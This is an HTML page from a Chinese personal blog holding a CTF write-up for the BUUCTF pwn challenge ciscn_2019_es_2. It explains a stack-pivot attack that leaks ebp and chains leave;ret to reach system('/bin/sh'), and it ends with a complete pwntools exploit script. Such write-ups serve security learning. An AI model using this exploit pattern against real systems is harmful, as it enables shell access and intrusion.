@@ -1,0 +1,594 @@
+<!DOCTYPE html>
+<html
+  lang="zh"
+  dir="ltr"
+  
+><meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+<title>【栈迁移例题解析】ciscn_2019_es_2 - Peter Liu的个人博客</title>
+
+<meta name="generator" content="Hugo Eureka 0.9.3" />
+<link rel="stylesheet" href="https://peterliuzhi.top/css/eureka.min.9cec6350e37e534b0338fa9a085bf06855de3b0f2dcf857e792e5e97b07ea905d4d5513db554cbc26a9c3da622bae92d.css">
+<script defer src="https://peterliuzhi.top/js/eureka.min.fa9a6bf6d7a50bb635b4cca7d2ba5cf3dfb095ae3798773f1328f7950028b48c17d06276594e1b5f244a25a6c969a705.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="preload"
+  href="https://fonts.googleapis.com/css2?family=Lora:wght@400;600;700&amp;family=Noto&#43;Serif&#43;SC:wght@400;600;700&amp;display=swap"
+  as="style" onload="this.onload=null;this.rel='stylesheet'">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/styles/base16/solarized-light.min.css"
+   media="print"
+  onload="this.media='all';this.onload=null" crossorigin>
+<script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/highlight.min.js"
+   crossorigin></script>
+  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/dart.min.js"
+     crossorigin></script>
+  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/python.min.js"
+     crossorigin></script>
+  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/bash.min.js"
+     crossorigin></script>
+<link rel="stylesheet" href="https://peterliuzhi.top/css/highlightjs.min.0e3b6ac4177cdecae52d1b2de76aa7a0ce8a92e4cc23ef2f8691f0218a25f5d328e14bf47be023009535efe940980954.css" media="print" onload="this.media='all';this.onload=null">
+
+
+
+<script src="https://kit.fontawesome.com/99649a0b4d.js" crossorigin="anonymous"></script>
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css"
+   integrity="sha384-MlJdn/WNKDGXveldHDdyRP1R4CTHr3FeuDNfhsLPYrq2t0UBkUdK2jyTnXPEK1NQ"  media="print"
+  onload="this.media='all';this.onload=null" crossorigin>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js" 
+  integrity="sha384-VQ8d8WVFw0yHhCk5E8I86oOhv48xLpnDZx5T9GogA/Y84DcCKWXDmSDfn13bzFZY"  crossorigin></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js"
+   integrity="sha384-&#43;XBljXPPiv&#43;OzfbB3cVmLHf4hdUFHlWNZN5spNQ7rmHTXpd7WvJum6fIACpNNfIR"  crossorigin></script>
+<script>
+  document.addEventListener("DOMContentLoaded", function () {
+    renderMathInElement(document.body, {
+      delimiters: [
+        { left: "$$", right: "$$", display: true },
+        { left: "$", right: "$", display: false },
+        { left: "\\(", right: "\\)", display: false },
+        { left: "\\[", right: "\\]", display: true }
+      ],
+    });
+  });
+</script>
+
+
+<script defer src="https://cdn.jsdelivr.net/npm/mermaid@8.14.0/dist/mermaid.min.js" 
+  integrity="sha384-atOyb0FxAgN9LyAc6PEf9BjgwLISyansgdH8/VXQH8p2o5vfrRgmGIJ2Sg22L0A0"  crossorigin></script>
+
+
+
+<link rel="icon" type="image/png" sizes="32x32" href="https://peterliuzhi.top/images/selficon_hu7999937fb0799ea2efe2916a84368012_9703_32x32_fill_q75_box_center.jpg">
+<link rel="apple-touch-icon" sizes="180x180" href="https://peterliuzhi.top/images/selficon_hu7999937fb0799ea2efe2916a84368012_9703_180x180_fill_q75_box_center.jpg">
+
+<meta name="description"
+  content="BUUCTF ciscn_2019_es_2的解析">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [{
+      "@type": "ListItem",
+      "position": 1 ,
+      "name":"Writeups",
+      "item":"https://peterliuzhi.top/writeup/"},{
+      "@type": "ListItem",
+      "position": 2 ,
+      "name":"【栈迁移例题解析】ciscn_2019_es_2",
+      "item":"https://peterliuzhi.top/writeup/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%BE%8B%E9%A2%98%E8%A7%A3%E6%9E%90ciscn_2019_es_2/"}]
+}
+</script>
+
+
+
+<script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "https://peterliuzhi.top/writeup/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%BE%8B%E9%A2%98%E8%A7%A3%E6%9E%90ciscn_2019_es_2/"
+    },
+    "headline": "【栈迁移例题解析】ciscn_2019_es_2 - Peter Liu的个人博客","datePublished": "2022-12-29T03:01:44+08:00",
+    "dateModified": "2022-12-29T03:01:44+08:00",
+    "wordCount":  1502 ,
+    "publisher": {
+        "@type": "Person",
+        "name": "Peter Liu",
+        "logo": {
+            "@type": "ImageObject",
+            "url": "https://peterliuzhi.top/images/selficon.jpg"
+        }
+        },
+    "description": "BUUCTF ciscn_2019_es_2的解析"
+}
+</script><meta property="og:title" content="【栈迁移例题解析】ciscn_2019_es_2 - Peter Liu的个人博客" />
+<meta property="og:type" content="article" />
+
+
+<meta property="og:image" content="https://peterliuzhi.top/images/selficon.jpg">
+
+
+<meta property="og:url" content="https://peterliuzhi.top/writeup/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%BE%8B%E9%A2%98%E8%A7%A3%E6%9E%90ciscn_2019_es_2/" />
+
+
+
+<meta property="og:description" content="BUUCTF ciscn_2019_es_2的解析" />
+
+
+
+<meta property="og:locale" content="zh" />
+
+
+
+
+<meta property="og:site_name" content="Peter Liu的个人博客" />
+
+
+
+
+
+
+<meta property="article:published_time" content="2022-12-29T03:01:44&#43;08:00" />
+
+
+<meta property="article:modified_time" content="2022-12-29T03:01:44&#43;08:00" />
+
+
+
+<meta property="article:section" content="writeup" />
+
+
+<meta property="article:tag" content="pwn" />
+
+<meta property="article:tag" content="栈迁移" />
+
+
+
+
+
+<meta property="og:see_also" content="https://peterliuzhi.top/writeup/call32%E6%A0%88%E8%BF%81%E7%A7%BBbuuctf-ciscn_2019_s_4/" />
+
+<meta property="og:see_also" content="https://peterliuzhi.top/writeup/jarvisoj_level2_x64/" />
+
+<meta property="og:see_also" content="https://peterliuzhi.top/writeup/ciscn_2019_ne_5/" />
+
+<meta property="og:see_also" content="https://peterliuzhi.top/writeup/32%E4%BD%8D%E7%B3%BB%E7%BB%9F%E4%BC%A0%E5%8F%82buuctf-picoctf_2018_rop-chain/" />
+
+<meta property="og:see_also" content="https://peterliuzhi.top/writeup/c&#43;&#43;pwnzjctf-2019login/" />
+
+<meta property="og:see_also" content="https://peterliuzhi.top/writeup/c%E5%86%85%E5%B5%8C%E6%B1%87%E7%BC%96others_shellcode/" />
+
+
+
+
+  <body class="flex min-h-screen flex-col">
+    <header
+      class="min-h-16 pl-scrollbar bg-secondary-bg fixed z-50 flex w-full items-center shadow-sm"
+    >
+      <div class="mx-auto w-full max-w-screen-xl"><style>
+.search-container {
+  margin-top: -0.3rem;
+  margin-right: 1rem;
+}
+.search-container .search {
+  border: 1px solid #e2e8f0;
+  border-radius: 4px;
+}
+.search-container input {
+  padding-left: 1rem;
+  line-height: 2rem;
+  outline: none;
+  background: transparent;
+}
+.search-container button {
+  font-size: 0.8rem;
+  margin-right: 0.5rem;
+  color: #e2e8f0;
+}
+</style>
+<script>
+    let storageColorScheme = localStorage.getItem("lightDarkMode")
+    if (((storageColorScheme == 'Auto' || storageColorScheme == null) && window.matchMedia("(prefers-color-scheme: dark)").matches) || storageColorScheme == "Dark") {
+        document.getElementsByTagName('html')[0].classList.add('dark')
+    }
+</script>
+<nav class="flex items-center justify-between flex-wrap px-4 py-4 md:py-0">
+    <a href="/" class="me-6 text-primary-text text-xl font-bold">Peter Liu的个人博客</a>
+    <button id="navbar-btn" class="md:hidden flex items-center px-3 py-2" aria-label="Open Navbar">
+        <i class="fas fa-bars"></i>
+    </button>
+
+    <div id="target"
+        class="hidden block md:flex md:grow md:justify-between md:items-center w-full md:w-auto text-primary-text z-20">
+        <div class="md:flex md:h-16 text-sm md:grow pb-4 md:pb-0 border-b md:border-b-0">
+            <a href="/#about" class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2  border-transparent  me-4">About</a>
+            <a href="/posts/" class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2  border-transparent  me-4">Posts</a>
+            <a href="/writeup/" class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2  selected-menu-item  me-4">WriteUp</a>
+            <a href="/tricks/" class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2  border-transparent  me-4">Tricks</a>
+            <a href="/archive/" class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2  border-transparent  me-4">Archive</a>
+        </div>
+
+        <div class="flex">
+            <div class="search-container relative pt-4 md:pt-0">
+                <div class="search">
+                    <form role="search" class="search-form" action="/search.html" method="get">
+                    <label>
+                        <input name="q" type="text" placeholder="搜索 ..." class="search-field">
+                    </label>
+                    <button>
+                        <i class="fa-solid fa-magnifying-glass"></i>
+                    </button>
+                    </form>
+                </div>
+            </div>
+
+        <div class="flex">
+            <div class="relative pt-4 md:pt-0">
+                <div class="cursor-pointer hover:text-eureka" id="lightDarkMode">
+                    <i class="fas fa-adjust"></i>
+                </div>
+                <div class="fixed hidden inset-0 opacity-0 h-full w-full cursor-default z-30" id="is-open">
+                </div>
+                <div class="absolute flex flex-col start-0 md:start-auto end-auto md:end-0 hidden bg-secondary-bg w-48 rounded py-2 border border-tertiary-bg cursor-pointer z-40"
+                    id='lightDarkOptions'>
+                    <span class="px-4 py-1 hover:text-eureka" name="Light">浅色</span>
+                    <span class="px-4 py-1 hover:text-eureka" name="Dark">深色</span>
+                    <span class="px-4 py-1 hover:text-eureka" name="Auto">自动</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="fixed hidden inset-0 opacity-0 h-full w-full cursor-default z-0" id="is-open-mobile">
+    </div>
+
+</nav>
+<script>
+    
+    let element = document.getElementById('lightDarkMode')
+    if (storageColorScheme == null || storageColorScheme == 'Auto') {
+        document.addEventListener('DOMContentLoaded', () => {
+            window.matchMedia("(prefers-color-scheme: dark)").addEventListener('change', switchDarkMode)
+        })
+    } else if (storageColorScheme == "Light") {
+        element.firstElementChild.classList.remove('fa-adjust')
+        element.firstElementChild.setAttribute("data-icon", 'sun')
+        element.firstElementChild.classList.add('fa-sun')
+    } else if (storageColorScheme == "Dark") {
+        element.firstElementChild.classList.remove('fa-adjust')
+        element.firstElementChild.setAttribute("data-icon", 'moon')
+        element.firstElementChild.classList.add('fa-moon')
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+        getcolorscheme();
+        switchBurger();
+    });
+</script>
+</div>
+    </header>
+    <main class="grow pt-16">
+        <div class="pl-scrollbar">
+          <div class="mx-auto w-full max-w-screen-xl lg:px-4 xl:px-8">
+  
+  
+  <div class="grid grid-cols-2 gap-4 lg:grid-cols-8 lg:pt-12">
+    <div
+      class=" bg-secondary-bg col-span-2 rounded px-6 py-8 lg:col-span-6"
+    >
+      <article class="prose">
+  <h1 class="mb-4">【栈迁移例题解析】ciscn_2019_es_2</h1>
+
+  <div
+  class="text-tertiary-text not-prose mt-2 flex flex-row flex-wrap items-center"
+>
+  <div class="me-6 my-2">
+    <i class="fas fa-calendar me-1"></i>
+    <span
+      >Thursday, December 29, 2022</span
+    >
+  </div>
+  <div class="me-6 my-2">
+    <i class="fas fa-clock me-1"></i>
+    <span>3分钟阅读时长</span>
+  </div>
+
+  
+    <div class="me-6 my-2">
+      <i class="fas fa-folder me-1"></i>
+      
+        <a href="https://peterliuzhi.top/categories/writeup/" class="hover:text-eureka"
+          >writeup</a
+        >
+      
+    </div>
+  
+
+  
+</div>
+
+
+  
+  
+
+  <h1 id="栈迁移例题解析write-upbuuctf-ciscn_2019_es_2">【栈迁移例题解析】【Write-up】BUUCTF ciscn_2019_es_2</h1>
+<p><a href="https://buuoj.cn/challenges#ciscn_2019_es_2">原题链接</a></p>
+<ul>
+<li><a href="#%E6%A0%88%E8%BF%81%E7%A7%BB%E4%BE%8B%E9%A2%98%E8%A7%A3%E6%9E%90write-upbuuctf-ciscn_2019_es_2">【栈迁移例题解析】【Write-up】BUUCTF ciscn_2019_es_2</a>
+<ul>
+<li><a href="#checksec%E6%9F%A5%E7%9C%8B%E7%A8%8B%E5%BA%8F%E6%9E%B6%E6%9E%84">checksec查看程序架构</a></li>
+<li><a href="#ida%E6%9F%A5%E7%9C%8B%E7%A8%8B%E5%BA%8F%E4%BC%AA%E4%BB%A3%E7%A0%81">ida查看程序伪代码</a></li>
+<li><a href="#%E6%9E%84%E5%BB%BAexp">构建exp</a>
+<ul>
+<li><a href="#%E6%A0%88%E8%BF%81%E7%A7%BB%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF">栈迁移的基本思路</a></li>
+<li><a href="#%E6%B3%84%E9%9C%B2ebp">泄露ebp</a></li>
+<li><a href="#%E5%BC%80%E5%A7%8B%E6%A0%88%E8%BF%81%E7%A7%BB">开始栈迁移</a></li>
+<li><a href="#%E5%AE%8C%E6%95%B4exp">完整exp</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="checksec查看程序架构">checksec查看程序架构</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ checksec --file ciscn_2019_es_2
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/peterl/security/workspace/ciscn_2019_es_2/ciscn_2019_es_2&#39;</span>
+</span></span><span class="line"><span class="cl">    Arch:     i386-32-little
+</span></span><span class="line"><span class="cl">    RELRO:    Partial RELRO
+</span></span><span class="line"><span class="cl">    Stack:    No canary found
+</span></span><span class="line"><span class="cl">    NX:       NX enabled
+</span></span><span class="line"><span class="cl">    PIE:      No PIE <span class="o">(</span>0x8048000<span class="o">)</span>
+</span></span></code></pre></div><p>没啥特殊的，注意一下32位就可</p>
+<h2 id="ida查看程序伪代码">ida查看程序伪代码</h2>
+<p><img src="../../image/202209251439012022-09-25-14-39-01.png" alt="202209251439012022-09-25-14-39-01"></p>
+<p><img src="../../image/202209251439252022-09-25-14-39-26.png" alt="202209251439252022-09-25-14-39-26"></p>
+<p>看起来像是栈溢出，但是read函数限制了读入的字节数，我们看一下栈：</p>
+<p><img src="../../image/202209251440452022-09-25-14-40-46.png" alt="202209251440452022-09-25-14-40-46">
+<img src="../../image/202209251441052022-09-25-14-41-06.png" alt="202209251441052022-09-25-14-41-06"></p>
+<p>我们发现这时候到return的位置只能溢出一个字，如果这时候程序有一个backdoor函数那就万事大吉。</p>
+<p>我们可以找一下，发现了一个hack函数，但这个hack函数完全就是糊弄人的，从中唯一得到的有用信息是system确乎存在于plt表中，这样就不用ret2libc了：</p>
+<p><img src="../../image/202209251443562022-09-25-14-43-56.png" alt="202209251443562022-09-25-14-43-56"></p>
+<p>看一下源程序也没有格式化字符串漏洞，我们可以考虑栈迁移</p>
+<p>我们只要泄露出ebp，然后再通过第二次<code>leave;ret</code>就可以将esp更改到我们希望的地方</p>
+<h2 id="构建exp">构建exp</h2>
+<h3 id="栈迁移的基本思路">栈迁移的基本思路</h3>
+<p>我们知道，在<code>call</code>一个函数的时候，我们会先将下一条指令的地址进栈，再将当前的ebp进栈，然后将当前esp的值赋给ebp，这样就实现了备份下一条指令的地址、ebp原本的值、esp原本的值的作用</p>
+<p>然后等到函数结束时，程序会执行<code>leave</code>指令和<code>ret</code>指令。<code>leave</code>指令相当于<code>mov esp, ebp; pop ebp</code>，意思就是从备份中先恢复esp再恢复ebp；<code>ret</code>指令相当于<code>pop eip</code>，意思就是恢复备份的指令地址，这样就能执行函数调用的下一条语句了</p>
+<p>那么如果我们更改栈中备份的ebp数据的同时，在程序执行过一次<code>leave; ret</code>后再执行一遍，那么因为ebp的备份已被更改，所以ebp恢复的就是我们希望的数据，而再执行一遍<code>leave; ret</code>时，程序是假定ebp中保存的是esp的备份，那么通过这种方法，我们就可以成功地更改esp。</p>
+<p>这时我们已经让栈顶指针指向了我们希望的位置，这时由于<code>leave</code>指令，程序会将我们伪造的栈顶的第一个数据<code>pop</code>进ebp，然后由于<code>ret</code>指令再将第二个数据弹进eip中，那么我们就应该在伪造的栈的第二个数据放入<code>system</code>函数的地址</p>
+<p>然后我们就可以当普通的栈溢出构造栈了。</p>
+<p><code>system</code>后面跟个0，再跟<code>/bin/sh</code>的地址就🆗了</p>
+<h3 id="泄露ebp">泄露ebp</h3>
+<p>我们看到源程序中：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">memset</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x20u</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="mh">0x30u</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Hello, %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">s</span><span class="p">);</span>
+</span></span></code></pre></div><p>这个s字符数组被初始化为全\0，此时如果我们将该数组所有的位都覆盖为垃圾数据，那么由于数组中没有\0了，它就会把紧跟在s后面的数据一齐打印出来，直到遇到一个\0为止。</p>
+<p>这里需要注意的是如果我们使用<code>sendline</code>函数，程序读入的字符最后会多一个\n，所以这里发送payload应该用<code>send</code>。同时在payload中使用一个与前面不同的字符做哨兵：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="mh">0x27</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;b&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">clean</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span></code></pre></div><p>也就是说我们只要满足：</p>
+<ul>
+<li>刚好输入0x28个数据</li>
+<li>输入的最后一个字符与前面输入的不同</li>
+</ul>
+<p>就可以了</p>
+<p>那么<code>sendline</code>函数也不是不可以用：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="mh">0x27</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">clean</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span></code></pre></div><p>用\n字符做哨兵就可以了。</p>
+<p>然后我们就可以<code>recv</code>ebp地址了：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;b&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">ebp_addr</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 我们可以讲礼貌一点，栈迁移完后返回地址和原来一样</span>
+</span></span><span class="line"><span class="cl"><span class="n">eip_addr</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
+</span></span></code></pre></div><h3 id="开始栈迁移">开始栈迁移</h3>
+<p>我们用gdb调试一下，发现当恢复ebp备份值的时候，这个备份值比当时ebp的值刚好多0x10：</p>
+<p><img src="../../image/202209251543542022-09-25-15-43-54.png" alt="202209251543542022-09-25-15-43-54"></p>
+<p>那么我们的payload就出来了：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">leave_ret</span> <span class="o">=</span> <span class="mh">0x080484b8</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># command也可以是cat flag</span>
+</span></span><span class="line"><span class="cl"><span class="n">command</span> <span class="o">=</span> <span class="s2">&#34;/bin/sh&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">pg</span><span class="p">(</span><span class="n">ebp_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">pg</span><span class="p">(</span><span class="n">m_elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">])</span> <span class="o">+</span> <span class="n">pg</span><span class="p">(</span><span class="n">eip_addr</span><span class="p">)</span> \
+</span></span><span class="line"><span class="cl">    <span class="o">+</span> <span class="n">pg</span><span class="p">(</span><span class="n">ebp_addr</span> <span class="o">-</span> <span class="mh">0x28</span><span class="p">)</span> <span class="o">+</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">command</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x18</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\0</span><span class="s2">&#34;</span><span class="p">),</span> <span class="n">encoding</span><span class="o">=</span><span class="s2">&#34;UTF-8&#34;</span><span class="p">)</span>\
+</span></span><span class="line"><span class="cl">        <span class="o">+</span> <span class="n">pg</span><span class="p">(</span><span class="n">ebp_addr</span> <span class="o">-</span> <span class="mh">0x38</span><span class="p">)</span> <span class="o">+</span> <span class="n">pg</span><span class="p">(</span><span class="n">leave_ret</span><span class="p">)</span>
+</span></span></code></pre></div><h3 id="完整exp">完整exp</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="n">p64</span><span class="p">,</span> <span class="n">p32</span><span class="p">,</span> <span class="n">u32</span><span class="p">,</span> <span class="n">u64</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># from LibcSearcher import LibcSearcher</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">pss</span><span class="p">:</span> <span class="nb">bool</span> <span class="o">=</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl"><span class="n">fn</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s2">&#34;./ciscn_2019_es_2&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># libc_name:str = &#34;/lib/i386-linux-gnu/libc.so.6&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">port</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">if_32</span><span class="p">:</span> <span class="nb">bool</span> <span class="o">=</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl"><span class="n">if_debug</span><span class="p">:</span><span class="nb">bool</span> <span class="o">=</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl"><span class="n">pg</span> <span class="o">=</span> <span class="n">p32</span> <span class="k">if</span> <span class="n">if_32</span> <span class="k">else</span> <span class="n">p64</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s2">&#34;debug&#34;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s2">&#34;i386&#34;</span> <span class="k">if</span> <span class="n">if_32</span> <span class="k">else</span> <span class="s2">&#34;amd64&#34;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s2">&#34;linux&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">pss</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;node4.buuoj.cn&#34;</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">if_debug</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">p</span> <span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="n">fn</span><span class="p">,</span> <span class="s2">&#34;b* 0x80485FD&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">fn</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">m_elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">fn</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">clean</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload1</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="mh">0x27</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">ebp_addr</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">eip_addr</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">success</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">ebp_addr</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">clean</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">leave_ret</span> <span class="o">=</span> <span class="mh">0x080484b8</span>
+</span></span><span class="line"><span class="cl"><span class="n">command</span> <span class="o">=</span> <span class="s2">&#34;/bin/sh&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">pg</span><span class="p">(</span><span class="n">ebp_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">pg</span><span class="p">(</span><span class="n">m_elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">])</span> <span class="o">+</span> <span class="n">pg</span><span class="p">(</span><span class="n">eip_addr</span><span class="p">)</span> \
+</span></span><span class="line"><span class="cl">    <span class="o">+</span> <span class="n">pg</span><span class="p">(</span><span class="n">ebp_addr</span> <span class="o">-</span> <span class="mh">0x28</span><span class="p">)</span> <span class="o">+</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">command</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x18</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\0</span><span class="s2">&#34;</span><span class="p">),</span> <span class="n">encoding</span><span class="o">=</span><span class="s2">&#34;UTF-8&#34;</span><span class="p">)</span>\
+</span></span><span class="line"><span class="cl">        <span class="o">+</span> <span class="n">pg</span><span class="p">(</span><span class="n">ebp_addr</span> <span class="o">-</span> <span class="mh">0x38</span><span class="p">)</span> <span class="o">+</span> <span class="n">pg</span><span class="p">(</span><span class="n">leave_ret</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">clean</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div>
+</article>
+
+
+      
+        <div class="my-4">
+    
